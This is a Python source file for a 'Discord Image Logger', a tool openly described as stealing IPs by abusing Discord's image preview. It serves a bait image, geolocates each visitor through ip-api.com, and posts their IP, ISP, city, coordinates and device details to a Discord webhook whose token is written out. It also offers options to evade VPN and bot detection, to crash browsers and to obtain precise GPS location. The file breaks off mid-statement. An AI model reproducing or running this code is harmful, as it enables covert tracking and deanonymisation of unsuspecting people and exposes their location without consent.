# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1400456592746483784/Sra4VyzN9xz1oMou5NbC4mY4cs1_LLI7mVM9PQEiZ6KaZqr7u_eIBHgnGJ4uLNCpLhRl",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
